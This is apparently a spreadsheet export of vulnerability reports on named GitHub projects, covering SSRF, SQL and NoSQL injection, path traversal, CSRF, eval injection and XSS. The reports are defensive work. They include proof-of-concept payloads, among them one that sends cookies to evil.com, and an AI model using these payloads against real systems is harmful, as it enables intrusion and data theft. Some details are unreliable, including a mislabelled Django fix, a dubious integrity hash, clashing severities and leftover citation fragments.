• Denial of Service: Polluting core properties can crash the application or corrupt business logic.

Real-world consequence
An attacker needs only to pass a crafted JSON payload containing ""__proto__"" keys. No special credentials or complex injection techniques are required—just the unsafe merge logic. Once Object.prototype is polluted, the entire runtime’s behavior can be controlled, leading to full takeover of server-side or client-side applications."
69,1745687783506,https://github.com/Ayobami-ANDROID/voting-app/blob/master/package.json,CWE-918,High,2025-04-27T11:41:56.000Z,2025-04-29T02:05:15.000Z,"Root Cause
The root cause is the inclusion of Axios ^1.3.6 on line 17 of package.json, which will resolve to a 1.x version at or below 1.7.3—a range known to mishandle path-relative URLs by treating them as protocol-relative, triggering unintended HTTP requests

Exploit Scenario
An attacker controlling a URL parameter could supply a path-relative string such as //169.254.169.254/latest/meta-data/ to an Axios request. Instead of being blocked or sanitized, Axios interprets it as a protocol-relative URL and issues a request to the AWS metadata endpoint, exposing sensitive credentials.

Why It Happens
Axios versions between 1.3.2 and 1.7.3 fail to validate or sanitize path-relative inputs, erroneously parsing them as protocol-relative URLs without adequate checks, thus enabling SSRF.

Security Implications
Network Bypass: Attackers can reach internal-only services (e.g., metadata or admin APIs) that should be inaccessible externally
Sensitive Data Exposure: Requests to internal endpoints can leak credentials, configuration secrets, or personal data.

Suggested Fix
Modify line 17 in your package.json to upgrade Axios to ^1.7.4 (or higher)—these versions include the patch that restores correct URL handling—and then run npm install (or yarn install) to apply the update
By addressing this single line in your dependency manifest, you remove a critical SSRF vector and significantly harden your application against unauthorized outbound HTTP requests.

 "
70,1745688729188,https://github.com/axios/axios,CWE-918,Medium,2025-04-27T11:45:52.000Z,2025-04-27T11:57:27.000Z,"This vulnerability (CVE-2024-39338) affects axios versions ≥1.3.2 and ≤1.7.3 by misinterpreting path-relative URLs (e.g. /google.com) as protocol-relative URLs (//google.com), causing the Node.js URL constructor to resolve them against http://localhost and issue unintended external requests 
NVD
GitHub
. The fix in axios 1.7.4 replaces the fixed 'http://localhost' base with undefined in Node.js (and the real origin in browsers), and updates isAbsoluteURL to recognize //host patterns as absolute, so malformed protocol-relative URLs now throw errors rather than resolve . Attackers can leverage this to make arbitrary HTTP requests from the server—such as probing internal services or exfiltrating sensitive data—by simply supplying a malicious path string to any axios call 
Snyk Security
GitHub
. The severity is rated High (CVSS 3.1 7.5, CWE-918), and the recommended mitigation is a prompt upgrade to axios ≥1.7.4 alongside strict URL validation and firewall rules 
NVD
SOCRadar® Cyber Intelligence Inc.
.

Explanation
Root Cause
Permissive Base URL in HTTP Adapter
In lib/adapters/http.js, axios previously did:

js
Copy
Edit
const parsed = new URL(fullPath, 'http://localhost');
This means any protocol-relative URL (//example.com) or path that looks like one (/example.com) would resolve to http://example.com instead of throwing an error .

Incomplete Absoluteness Check
The helper isAbsoluteURL.js originally used:

js
Copy
Edit
return /^([a-z][a-z\d+\-.]*:)\/\//i.test(url);
which fails to catch URLs starting with // (no scheme), so they weren’t treated as absolute and got passed into buildFullPath .

Affected Versions
All releases from 1.3.2 up to and including 1.7.3 exhibit this behavior; axios 1.7.4 and later are patched 
GitHub
.

Patch Details
HTTP Adapter Change

diff
Copy
Edit
- const parsed = new URL(fullPath, 'http://localhost');
+ const parsed = new URL(fullPath, utils.hasBrowserEnv ? platform.origin : undefined);
Now, in Node.js (hasBrowserEnv === false), a URL without an explicit scheme causes new URL() to throw .

Helper Update

diff
Copy
Edit
- return /^([a-z][a-z\d+\-.]*:)\/\//i.test(url);
+ return /^([a-z][a-z\d+\-.]*:)?\/\//i.test(url);
This correctly flags protocol-relative URLs (//host) as absolute, so they bypass buildFullPath .

Test Coverage
New tests ensure SSRF attempts now error out server-side, while normal client-side relative requests still work .

Exploitation
Attack Vector
Control over URL Path
Any application using a vulnerable axios instance with a configurable baseURL is at risk if user input directly influences the request path 
Snyk Security
.

Crafting Malicious Requests
By submitting a path such as /google.com, axios constructs this fullPath and, under the old behavior, resolves it to http://google.com rather than https://api.example.com/google.com 
Snyk Security
.

Proof-of-Concept
js
Copy
Edit
const axios = require('axios');

const client = axios.create({
  baseURL: 'https://userapi.example.com'
});

// Attacker-controlled input
const maliciousPath = '/169.254.169.254/latest/meta-data/'; 

// Vulnerable request — unexpectedly targets AWS IMDS
client.get(maliciousPath)
  .then(res => console.log(res.data))
  .catch(err => console.error('Error:', err));
This will cause the server to fetch metadata from AWS IMDS at http://169.254.169.254 
Snyk Security
.

Real-World Scenarios
Internal Service Enumeration
Attackers can scan internal host and port combinations by varying the path, e.g. /internal.service:8080 
SOCRadar® Cyber Intelligence Inc.
.

Exfiltrating Sensitive Data
Reaching management APIs, metadata endpoints, or private databases not directly exposed externally 
IBM - United States
.

Chained Attacks
SSRF can lead to remote code execution when combined with deserialization or other flaws 
SOCRadar® Cyber Intelligence Inc.
.

Impact
Severity Metrics
CVSS 3.1 Base Score: 7.5 (High) 
NVD

CWE: CWE-918 (SSRF) 
NVD

Potential Consequences
Unauthorized Internal Access: Read data from intranet services or cloud instance metadata 
Acunetix

Credential Theft: Harvest tokens or credentials from metadata endpoints (AWS, GCP, Azure) 


Lateral Movement: Once inside, pivot to other internal resources, escalating privileges 

Affected Environments
Node.js Servers using axios 1.3.2–1.7.3 

Products Bundling axios, e.g., IBM Sterling External Auth Server and IBM Data Product Hub were specifically called out as vulnerable in vendor bulletins 

Mitigation
1. Upgrade Axios
Move to axios 1.7.4 or later, or the corresponding patched branch for older major versions 

2. Input Validation
Implement strict allow-lists for URL paths or fully validate that user inputs start with safe prefixes before passing to axios 

3. Network Controls
Use a Web Application Firewall (WAF) or egress filtering to block requests to private IP ranges and metadata service addresses 

4. Monitoring & Alerting
Log and alert on any axios requests that target abnormal hosts (e.g. 169.254.169.254) or use protocol-relative syntax at runtime.

"
71,1745689328958,https://github.com/himarnoel/Edtech-Backend/blob/main/Pipfile,CWE-89,High,2025-04-27T11:50:53.000Z,2025-04-29T01:55:12.000Z,"In your Pipfile, the Django dependency is pinned to ==5.1 on line 7, which lies squarely in the vulnerable range for CVE-2024-53908 (CWE-89). This flaw allows untrusted input in a HasKey(lhs, rhs) lookup to be interpolated directly into Oracle SQL, opening the door to full SQL injection. Upgrading Django to 5.1.4 (or any later patched release) immediately removes this risk and restores proper parameterization.
[packages]
- django = ""==5.1"" # line 7: vulnerable to SQL injection via HasKey(lhs, rhs) on Oracle :contentReference[oaicite:0]{index=0}
+ django = "">=5.1.4"" # fix: includes patch for CVE-2024-53908 :contentReference[oaicite:1]{index=1}



Root Cause
Your Pipfile pins Django to 5.1 (line 7), a version affected by the Oracle-specific SQL injection in the django.db.models.fields.json.HasKey lookup when an untrusted value is used as the left-hand side (lhs)

Exploit Scenario
An attacker submits a malicious JSON key name—such as {""__dummy"": """"} OR 1=1; --—to a view performing MyModel.objects.filter(myjsonfield__has_key=payload). On Oracle, this unescaped lhs is concatenated into the WHERE clause, transforming the query into something like:

 [SELECT ... WHERE JSON_EXISTS(myjsonfield, '$ ? \""dummy\""') OR 1=1; --'] which returns all rows or allows arbitrary SQL execution

Why It Happens
Between Django 5.1.0 and 5.1.3 (and similarly in 5.0.0–5.0.9, 4.2.0–4.2.16), the HasKey(lhs, rhs) implementation directly injects the lhs identifier into the SQL fragment without proper escaping or parameter binding, a design oversight unique to the Oracle backend.

Security Implications
Full SQL Injection (CWE-89): Attackers can read, modify, or delete arbitrary rows in your database, bypassing all Django-level protections.
Data Exposure & Tampering: Sensitive user credentials, PII, or configuration data stored in the database can be exfiltrated or tampered with.
Privilege Escalation: If administrative tables are exposed, attackers may elevate privileges or corrupt your schema.

Suggested Fix
Upgrade Django immediately to a patched release—5.1.4, 5.0.10, or 4.2.17—all of which include the fix that enforces proper parameterization and internal validation of the lhs value. Then, regenerate your lock file.

pip install ""django>=5.1.4""
pipenv lock --clear


This single-line change at line 7 of your Pipfile eliminates the SSRF vector and restores the integrity of your database queries."
72,1745689377083,https://github.com/EricDLarson/RetailAI.git,CWE-353,Low,2025-04-26T17:42:57.000Z,2025-04-27T05:34:02.000Z,"Vulnerability Type: CWE-353: Missing Support for Integrity Check

Proof of Concept:
The following HTML tag loads an external script without the integrity attribute:

xml
<script src=""https://code.jquery.com/jquery-3.6.0.js""></script>

Without integrity, the browser cannot verify if the file has been tampered with. An attacker who compromises the CDN or intercepts the connection could inject malicious code, which would then execute in the user's browser.
Solution:
Always include the integrity and crossorigin attributes to ensure the browser only executes the expected file:

xml
<script src=""https://code.jquery.com/jquery-3.6.0.min.js"" integrity=""sha384-H+K7U5CnXl1h5ywQ+z3l9P7l6N9t4UHVX0EBaL7Y5nVwE9x4IYm9OV2w5a0Z8XFx"" crossorigin=""anonymous""></script>

This ensures the browser checks the downloaded file's hash against the expected value and refuses to execute it if it doesn't match.

Severity: LOW

Root Cause:
The root cause of this vulnerability is the omission of integrity check mechanisms-such as the integrity attribute for HTML subresources or checksums in protocols-when loading external resources or transmitting data. Without these mechanisms, the application cannot verify whether the fetched or transmitted data has been tampered with by unauthorized parties. This oversight often stems from developers’ overreliance on trusted sources (like popular CDNs or HTTPS) and a lack of rigorous threat modeling, leading them to skip implementing explicit integrity validation. As a result, there is no way to determine if data or resources have been corrupted or maliciously altered during transmission or at the source, exposing the application to supply chain and man-in-the-middle attacks

Exploit Scenario:
If an attacker gains access to the CDN or performs a man-in-the-middle attack, they can modify the external script to include malicious code. When a user loads the page, their browser downloads and executes the altered script, potentially resulting in session hijacking, credential theft, or malware installation.

Why It Happens:
Developers often trust reputable CDNs and assume HTTPS is sufficient for security. However, without the integrity attribute, the browser cannot detect if the file has been maliciously altered in transit or at the source. This design flaw leaves a critical gap in the security of externally loaded resources.

Security Implications:
The absence of integrity checks exposes applications to significant security risks. Attackers can exploit this weakness by injecting malicious code into external scripts or stylesheets, or by tampering with data during transmission. If a remote resource is altered-either through a compromised CDN or a man-in-the-middle attack-users may unknowingly execute harmful scripts, leading to cross-site scripting (XSS), session hijacking, data breaches, or the installation of malware. This can compromise the confidentiality, integrity, and availability of both user data and the web application itself, potentially resulting in unauthorized information disclosure, command injection, reputational damage, and even compromise of the entire deployment pipeline.

Suggested Fix:
Always specify the integrity and crossorigin attributes when including third-party scripts or stylesheets. The integrity attribute should contain a cryptographic hash (e.g., SHA-384) of the expected file, ensuring the browser only executes resources that match the specified hash. This practice significantly reduces the risk of supply chain attacks and unauthorized code execution"
73,1745689557919,https://github.com/adrianhajdin/node_express_crud_api,CWE-770,Low,2025-04-26T17:45:57.000Z,2025-04-27T05:21:22.000Z,"Vulnerability Type:
CWE-770: Allocation of Resources Without Limits or Throttling

Proof of Concept:
In index.js:

const app = express();
app.use(bodyParser.json());

No rate-limiting middleware is applied which allows a malicious client to send unlimited HTTP requests which can lead to server resources (CPU, memory) getting exhausted.

Severity:
2 (Low)

Root Cause:
The server accepts and processes all incoming requests without checking the frequency or number of requests per IP. There are no restrictions that prevent resource exhaustion or abuse.

Exploit Scenario:
An attacker could automate thousands of requests per second to your API endpoints. This would slow down or crash the server, making the Users API unavailable to legitimate users (Denial of Service).

Why It Happens?
The lack of any request throttling mechanism allows a user or bot to flood the API without consequences, causing service disruption or performance degradation.

Security Implications
The server could be overwhelmed, leading to downtime, financial losses, and damaged reputation. Brute force attempts could also target authentication mechanisms if they exist later.

Suggested Fix
Use a library like express-rate-limit to restrict the number of requests from each IP in a given amount of time."
74,1745689718189,sky8652/laravel-blog-2/blob/master/node_modules/.0.11.1%40faye-websocket/examples/server.js,CWE-23 ,High,2025-04-27T16:17:28.000Z,2025-04-27T17:09:03.000Z,"FILE PATH: laravel-blog-2/node_modules/.0.11.1@faye-websocket/examples/server.js
FILE LINE: 49 - 52
FILE LINK: https://github.com/sky8652/laravel-blog-2/blob/master/node_modules/.0.11.1%40faye-websocket/examples/server.js

•	Vulnerability Type: 
o	CWE-23 Relative Path Traversal


•	Root Cause: 
o	Unsanitized input from the request URL flows into fs.readFile, where it is used as a path. This may result in a Path Traversal vulnerability and allow an attacker to read arbitrary files.


•	Exploit Scenario: 
o	An attacker sends an HTTP request with a specially crafted URL containing traversal sequences like ../../../../etc/passwd.
o	Since the staticHandler function concatenates the unvalidated request.url directly to a filesystem path (__dirname + path), the server would attempt to read and return the contents of files outside the intended directory.

•	Proof of concept
o	For example, requesting http://server:7000/../../../../etc/passwd could leak sensitive system files.


•	Why It Happens: 
o	The code directly appends request.url to __dirname without any validation or sanitization.
o	This allows an attacker to inject relative path traversal (../) patterns to escape the intended directory.
o	Node.js fs.readFile will happily read any file as long as the constructed path points to a valid location, making this a classic CWE-23: Relative Path Traversal vulnerability.


•	Security Implications: 
o	Unauthorized access to sensitive files and server internals.
o	Potential exposure of passwords, private keys, database credentials, or application source code.
o	Information disclosure could facilitate further attacks like remote code execution or privilege escalation.
o	Severe reputation damage and potential legal liabilities if sensitive user data is leaked.


•	Suggested Fix: 
o	Normalize and validate the request URL path.
o	Ensure the resolved path always remains within a trusted base directory.
o	Reject or sanitize any suspicious path patterns (e.g., containing .. or null bytes)."
75,1745691925343,https://github.com/incodellc/finance-test-task,CWE-352,High,2025-04-27T06:36:05.000Z,2025-04-27T07:00:08.000Z,"Vulnerability Type:
CWE-352: Cross-Site Request Forgery (CSRF)

Proof of Concept:
The following code snippet handles incoming requests without implementing any CSRF protection middleware:

javascript
Copy
Edit
app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html');
});
Since there is no CSRF protection such as using the csurf middleware, an attacker can craft malicious requests that the user's browser unknowingly executes while authenticated.
There is no verification to ensure that the request originates from a trusted source.

Severity:
HIGH

Root Cause:
The Express application does not integrate CSRF protection mechanisms like csurf. This omission leads the server to blindly trust any incoming request without confirming its origin or legitimacy. Without requiring security tokens or validating headers like Origin or Referer, the server becomes vulnerable to cross-site request forgery attacks where unauthorized actions can be performed on behalf of legitimate users.

Exploit Scenario:
An attacker can lure a logged-in user into visiting a malicious page that automatically sends crafted HTTP requests (GET or POST) to the vulnerable server. Since no CSRF protection is in place, the server processes these requests under the user’s authenticated session, allowing the attacker to perform unauthorized actions like modifying account information, submitting fraudulent stock orders, or stealing user data.

Why It Happens:
This vulnerability occurs because the server accepts user requests without verifying whether they are intentional or originated from a trusted source. Developers often mistakenly assume that using HTTPS or session-based authentication alone is sufficient. However, without explicitly validating requests via CSRF tokens, the server cannot distinguish legitimate interactions from maliciously induced ones, creating a serious security gap that attackers can easily exploit.

Security Implications:
If exploited, attackers could force authenticated users to perform unintended actions on the server, such as transferring money, updating account settings, or even deleting accounts. This could lead to severe breaches of confidentiality, integrity, and availability of user data and actions, ultimately resulting in reputational damage, financial loss, and compromised trust in the application.

Suggested Fix:
To resolve this vulnerability, integrate CSRF protection middleware like csurf into the Express application. Use it to generate a CSRF token for each user session and validate the token on every sensitive request. The token should be sent to the client via a cookie or form field and must be included in subsequent requests. Enforcing CSRF token validation helps confirm that requests originate from legitimate, user-initiated actions, thereby mitigating CSRF risks effectively.

"
76,1745693326114,https://github.com/EpistasisLab/tpot,CWE-95,High,2025-04-26T18:48:46.000Z,2025-04-27T04:03:11.000Z,"Vulnerability Type:
CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')

Severity:
High

Root Cause:
In the TPOTBase class, there are two instances where the eval() function is used directly on dynamic input without proper validation or sanitization. Specifically, at line 529 (`self.operators_context[var] = eval(var)`) and line 1422 (`sklearn_pipeline = eval(sklearn_pipeline_str, self.operators_context)`), user-controllable strings are evaluated as Python code. This introduces a critical risk because if an attacker can influence these variables, they can execute arbitrary code within the running process.

Proof of Concept:
An attacker could inject malicious input into the variables that are passed to eval(). For example:
```python
var = ""__import__('os').system('echo hacked')""
eval(var)
```
This would execute the 'echo hacked' command on the system. Similarly, for the pipeline string:
```python
sklearn_pipeline_str = ""__import__('os').system('id')""
eval(sklearn_pipeline_str, self.operators_context)
```
This would execute the 'id' command, confirming code execution on the server. Both examples show how arbitrary commands can be injected and executed.

Exploit Scenario:
An attacker could modify a configuration file or input to inject malicious Python code into the operator imports or pipeline structure. When TPOTBase attempts to parse these fields using eval(), it would unknowingly execute the malicious payload. The attacker could then achieve goals such as executing shell commands, stealing sensitive files, opening backdoors, or disabling security measures — fully compromising the system.

Why It Happens:
This vulnerability arises because the code assumes the dynamic content being evaluated is always safe, without implementing restrictions or input validation. Using eval() directly on external or untrusted input violates fundamental secure coding practices, making it easy for attackers to inject arbitrary code.

Security Implications:
Successful exploitation can lead to full system compromise. Potential impacts include execution of arbitrary operating system commands, unauthorized access to sensitive information, destruction of data, persistence of malware, and elevation of privileges. This could affect the confidentiality, integrity, and availability of critical systems or data, resulting in catastrophic organizational impacts.

Suggested Fix:
Avoid the use of eval() entirely for dynamic content. Instead:
- Replace unsafe `eval(var)` with `getattr(importlib.import_module(module), var)`.
- Replace unsafe evaluation of pipeline strings with `compile()` followed by `eval()` in a restricted environment where `__builtins__` are disabled.
- Validate and strictly control any dynamic content before execution.
- Use safe parsing methods like ast.literal_eval() for simple data structures when applicable.
These changes prevent code injection, ensure only intended operations occur, and greatly reduce the attack surface.


"
77,1745694754603,https://github.com/Charlie-belmer/nosqli,CWE-943,High,2025-04-27T06:11:23.000Z,2025-04-27T07:13:54.000Z,"Vulnerability Type:
CWE-943: Improper Neutralization of Special Elements in Data Query Logic

Severity:
High

Root Cause:
The application directly uses unsanitized user inputs from `serviceData.email`, `decodedJwtToken.id`, and `serviceData.body.userName` in MongoDB operations like `findOne` and `findOneAndUpdate`. Since MongoDB interprets certain special characters (e.g., `$`, `{}`, `}`) as query operators, failing to sanitize input allows attackers to manipulate database queries by injecting special operators. This unsafe pattern creates an exploitable NoSQL Injection vulnerability.

Proof of Concept:
Consider a malicious login payload:
```json
{
  ""email"": { ""$gt"": """" }
}
```
This input would cause the application to execute:
```javascript
User.findOne({ email: { ""$gt"": """" } })
```
which would match any user email greater than an empty string, effectively bypassing login checks and allowing unauthorized access. Similarly, during profile updates, injecting structures like:
```json
{
  ""userName"": { ""$set"": { ""role"": ""admin"" } }
}
```
could escalate privileges without authorization if not sanitized.

Exploit Scenario:
An attacker could craft input containing MongoDB query operators and submit it during login, registration, or profile update requests. Successful injection would allow the attacker to:
- Log in without knowing any password.
- Access and modify user accounts.
- Escalate privileges to administrative levels.
- Corrupt or delete sensitive data.
This could severely impact the confidentiality, integrity, and availability of the system.

Why It Happens:
The vulnerability arises because the code trusts user-controlled input and uses it directly inside MongoDB query objects. Mongoose operations like `findOne({ field: userInput })` without sanitization are dangerous because MongoDB parses objects with special query operators like `$gt`, `$ne`, `$regex`, enabling manipulation of queries. Without input sanitization or schema validation, the database logic is easily subverted.

Security Implications:
Exploitation of NoSQL Injection vulnerabilities can lead to:
- Unauthorized authentication bypass.
- Unauthorized access or modification of sensitive user data.
- Privilege escalation to administrator accounts.
- Corruption or destruction of database records.
- Full compromise of the application backend.
Overall, NoSQL Injection undermines the security triad: confidentiality, integrity, and availability.

Suggested Fix:
All user inputs should be sanitized before being incorporated into database queries. Implement a `sanitize()` function that removes dangerous characters and structures, allowing only safe characters (letters, numbers, dots, dashes, @ symbols). 
Additionally:
- Validate inputs using libraries like `Joi`, `express-validator`, or Mongoose's built-in schema validation.
- Never trust client data to form database queries directly.
- Always apply the principle of least privilege at both application and database levels.
Following these secure coding practices ensures input safety and mitigates NoSQL injection risks.

"
78,1745698334439,https://github.com/johm/infoshopkeeper.git,CWE-79,Very Low,2025-04-26T20:12:14.000Z,2025-04-27T03:41:57.000Z,"Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Proof of Concept:
In the `calendar-setup.js` file, multiple instances use the `innerHTML` property unsafely to inject dynamic content into the DOM, for example:
```javascript
p.displayArea.innerHTML = cal.date.print(p.daFormat);
params.date = Date.parseDate(dateEl.value || dateEl.innerHTML, dateFmt);
```
If an attacker manages to inject a malicious payload like `<img src=x onerror=alert('XSS')>` into a field (e.g., inputField, displayArea), then when the calendar displays or processes the input using `innerHTML`, it will interpret and execute the injected JavaScript code inside the user's browser. This can result in full client-side script execution, leading to cross-site scripting (XSS) vulnerabilities.

Severity:
Low

Root Cause:
The root cause is the use of unsafe document manipulation methods like `innerHTML` to assign or read user-influenced data without any validation, escaping, or sanitization. `innerHTML` parses and executes any HTML tags or embedded scripts inside the assigned string, making it dangerous if the input is user-controllable. The code assumes that inputs (e.g., from `inputField.value` or `displayArea.innerHTML`) are safe, which is not guaranteed in real-world applications.

Exploit Scenario:
An attacker could manipulate a field such as an input box that populates the calendar, inserting a payload like `<img src=x onerror=alert('XSS')>`. When the user opens or interacts with the calendar, the vulnerable code assigns the payload to the DOM via `innerHTML`, causing the browser to execute the malicious script. This could be exploited to:
- Steal session cookies.
- Redirect users to malicious websites.
- Perform unauthorized actions on behalf of users.
- Log keystrokes or capture sensitive user information.

Why It Happens:
The vulnerability occurs because `innerHTML` inherently treats its assigned content as HTML markup rather than as literal text. In this case, the calendar setup script directly uses values from `dateEl.value` or `displayArea.innerHTML` without any validation or escaping. When the user input is not sanitized, this can allow HTML injection or script execution. Safer methods like `textContent`, which treat data as plain text rather than executable HTML, were not used.

Security Implications:
If exploited, this vulnerability could allow attackers to execute arbitrary JavaScript in a user’s browser session, leading to severe consequences such as:
- Full control over the user's session.
- Credential theft, data leakage, or impersonation.
- Defacement of the website or redirection to malicious domains.
- Potential spread of malware through trusted websites.
Even though the severity is classified as ""Low"" in standard scoring, XSS attacks can cause significant real-world damage depending on the context of exploitation.

Suggested Fix:
All instances where dynamic content is inserted into the DOM should avoid using `innerHTML` unless absolutely necessary. Specifically:
- Replace `innerHTML` assignments with `textContent` to ensure that dynamic content is treated as raw text rather than executable HTML.
Example:
```javascript
// Vulnerable
p.displayArea.innerHTML = cal.date.print(p.daFormat);

// Fixed
p.displayArea.textContent = cal.date.print(p.daFormat);
```
- If HTML insertion is needed, use a trusted sanitization library like DOMPurify to clean any user-provided input.
- Conduct a thorough code review to identify and fix similar unsafe patterns (`innerHTML`, `outerHTML`, `document.write`) across the entire codebase.
Following these practices will effectively eliminate the risk of XSS introduced by insecure document methods.
"
79,1745700667254,https://github.com/AMU-Code-Squad/food-up.git,CWE-352,Medium,2025-04-26T20:51:07.000Z,2025-04-27T02:48:08.000Z,"Vulnerability Type:
CWE-352: Cross-Site Request Forgery (CSRF)

Proof of Concept:
In the provided Express application, CSRF protection middleware like csurf is not implemented.
Without CSRF tokens, an attacker can trick authenticated users into submitting unintended actions.

Example vulnerable code:

javascript
Copy
Edit
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
// No CSRF middleware is used before sensitive routes
app.use(require('./routes/index'));
Step-by-Step:

The app trusts any POST/PUT/DELETE request without verifying its origin.

If a user is authenticated, a malicious site can send a forged request on their behalf.

The server processes the action without detecting the forgery.

Severity:
HIGH

Root Cause:
The application initializes user sessions and processes incoming HTTP requests without validating them through CSRF tokens.
Without CSRF protection middleware, the application cannot distinguish legitimate user requests from forged requests by malicious actors.

Exploit Scenario:
A victim logs into the vulnerable application. While logged in, the victim visits a malicious site that silently triggers a crafted form submission (e.g., deleting their account, changing their email, or making a transaction) without their consent.

Example attack form:

html
Copy
Edit
<form action=""https://vulnerable-app.com/deleteAccount"" method=""POST"">
  <input type=""hidden"" name=""userId"" value=""victim_id"">
</form>
<script>document.forms[0].submit();</script>
Why It Happens:
The application accepts incoming state-changing requests (like POST, PUT, DELETE) without requiring a CSRF token, which would validate that the request genuinely came from the user's own session and interface.

Security Implications:
Successful exploitation can allow attackers to perform sensitive operations on behalf of users without their consent, such as:

Account deletion

Email change

Posting unauthorized content

Fund transfer This can lead to severe data breaches, financial loss, and reputational damage to the organization.

Suggested Fix:
Implement CSRF protection middleware such as csurf:

Initialize csurf after session middleware.

Embed the CSRF token in every form or AJAX request.

Validate the CSRF token on every incoming state-changing request."
80,1745732280428,https://github.com/YetiForceCompany/YetiForceCRM/blob/developer/app/Fields/File.php,"CWE-23, CWE-22",Critical,2025-04-27T06:08:54.000Z,2025-04-27T06:22:40.000Z,"Vulnerability Type:
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
Proof of Concept:
[Line 241] Refer the ZIP file for the vulnerable file
if (!file_put_contents($path, $contents)) { 
}
•	$path is taken directly (or influenced) from user input without sanitization.
•	An attacker can supply a crafted path like ../../../../etc/passwd which will cause the server to write to sensitive locations outside the intended directory.
Severity:
High (based on potential full system compromise or unauthorized data overwrite)
Root Cause:
The code does not validate or sanitize the user-supplied $path before using it in file_put_contents, allowing directory traversal sequences (../) to access arbitrary locations on the file system.
Exploit Scenario:
if (!file_put_contents($path, $contents)) {
    // error handling
}
Step-by-step Exploitation:
•	The variable $path is set based on user input or is influenced by user-supplied data.
•	No checks are performed to ensure $path remains within a specific allowed directory.
•	An attacker submits a specially crafted path like:
../../../../var/www/html/index.php
The application interprets the path literally and writes to an unintended location.
Why It Happens:
The vulnerability occurs because the code trusts and uses user-controlled input for the file path directly in filesystem operations without verifying if the path stays within an expected safe directory.
Security Implications:
If exploited, an attacker could overwrite critical application files, inject malicious code, or tamper with server configurations, leading to unauthorized system access, data corruption, or complete server compromise.
Suggested Fix:
Implement strict path sanitization: resolve the final path using realpath() and ensure it is within an allowed directory, or explicitly restrict allowed file names and directories. Always validate and whitelist user inputs.
--- original_file.php	2025-04-27
+++ fixed_file.php	2025-04-27
@@
 $safe_base_dir = '/var/www/uploads/'; // Define a safe base directory
 $real_path = realpath($safe_base_dir . '/' . basename($path));

 if ($real_path === false || strpos($real_path, $safe_base_dir) !== 0) {
     die('Invalid file path!');
 }
 if (!file_put_contents($real_path, $contents)) {
     // error handling
 }
"
81,1745733461012,https://github.com/YetiForceCompany/YetiForceCRM/blob/developer/public_html/layouts/basic/modules/Vtiger/resources/DashBoard.js,CWE-79,Medium,2025-04-27T05:57:41.000Z,2025-04-27T06:30:29.000Z,"[Detail Report in DOC format attached in ZIP File]
Vulnerability Type:
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
Proof of Concept:
Vulnerable Code Sections:
$('.js-widget-list').append(data);
$('.dashboardViewContainer').html(data);
filteridSelectDOM.empty().html(res).trigger('change');
fieldsSelectDOM.empty().html(fieldsHTML).trigger('change');
Step-by-Step Explanation:
1.	data, res, fieldsHTML — all originate from user-controlled or external sources (server responses, request parameters).
2.	The code injects raw HTML into the page DOM using .append() and .html().
3.	If an attacker can control data or res (even partially), they could inject malicious <script> tags.
4.	This leads to arbitrary JavaScript execution inside the victim’s browser — a stored or reflected XSS.
Example Payload:
<script>alert('XSS by attacker')</script>
Injected via any widget title, server response, or malicious widget configuration.
Severity:
Critical (Stored or Reflected XSS = full session hijacking risk)
Root Cause:
The application directly renders unsanitized HTML content (data, res, fieldsHTML) into the DOM without escaping HTML entities or validating the source of the data.
This allows malicious input to be executed as JavaScript in the browser.
Exploit Scenario:
An attacker uploads or edits a widget to include a payload like:
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
When any legitimate user loads the dashboard, the browser executes the malicious JavaScript, causing:
•	Session hijacking
•	Account takeover
•	Potential complete control over the application from the victim's side.
Why It Happens:
Because dangerous methods (.html(), .append()) are used without escaping, encoding, or sanitization of the inserted content, making it possible for attackers to inject executable scripts into the page.
Security Implications:
If exploited, the attacker can:
•	Hijack user sessions (including admin)
•	Deface the dashboard
•	Steal sensitive information
•	Launch further attacks from trusted user accounts (Stored XSS persists)
Suggested Fix:
--- DashBoard.js	2025-04-27
+++ DashBoard_fixed.js	2025-04-27
@@
- $('.js-widget-list').append(data);
+ $('.js-widget-list').append(DOMPurify.sanitize(data));

- $('.dashboardViewContainer').html(data);
+ $('.dashboardViewContainer').html(DOMPurify.sanitize(data));

- filteridSelectDOM.empty().html(res).trigger('change');
+ filteridSelectDOM.empty().html(DOMPurify.sanitize(res)).trigger('change');

- fieldsSelectDOM.empty().html(fieldsHTML).trigger('change');
+ fieldsSelectDOM.empty().html(DOMPurify.sanitize(fieldsHTML)).trigger('change');
//must include the DOMPurify library in your project for this patch."
82,1745736611936,https://github.com/konecty/Konecty/blob/main/src/server/routes/rest/stream/streamApi.ts,CWE-1287,Low,2025-04-27T06:50:11.000Z,2025-04-27T12:13:47.000Z,"Vulnerability Type:
CWE-1287: Improper Neutralization of Input During Data Processing ('Improper Type Validation')
Proof of Concept (Elaborated):
Vulnerable Code: [line 15,16]
if (req.query.filter != null && isString(req.query.filter)) {
    req.query.filter = JSON.parse(req.query.filter.replace(/\+/g, ' '));
}
Step-by-Step Explanation:
1.	Improper Type Handling:
Only checks if req.query.filter is a string (isString(req.query.filter)), but does not validate the contents before attempting JSON.parse.
2.	Blind Parsing:
Attacker can send a crafted payload in filter query param such as:
3.	filter={""__proto__"":{""admin"":true}}
or worse, send invalid/maliciously constructed JSON.
4.	Consequences:
o	Prototype Pollution Attack:
Parsing malicious payloads could allow attackers to modify application behavior at runtime.
o	Server Crash (DoS):
If JSON.parse fails (invalid JSON), and if no global error handler is in place, it can crash the server.
o	Security Bypass:
Malicious values in filter may bypass logical validations downstream if fields are polluted or corrupted.
Example Attack:
Request:
GET /rest/stream/documents/find?filter={""__proto__"":{""isAdmin"":true}}
Impact:
•	Pollutes Object.prototype, potentially giving all objects unexpected properties like isAdmin: true, resulting in privilege escalation.
Severity:
Critical (Prototype Pollution + DoS)
Root Cause:
The server code trusts that req.query.filter is safe for parsing, performing JSON.parse() directly on it without:
•	Verifying its structure
•	Limiting its keys
•	Safely parsing with input sanitation
Exploit Scenario:
An attacker sends a maliciously crafted query parameter like:
?filter={""__proto__"":{""admin"":true}}
The unsafe JSON.parse executes, allowing runtime prototype manipulation.
This could lead to:
•	Elevation of privileges
•	Broken application logic
•	Server-side crashes
•	Unexpected permission grants
Why It Happens:
The vulnerability occurs because only the data type (string) is validated, but the content's safety is not verified before executing JSON.parse().
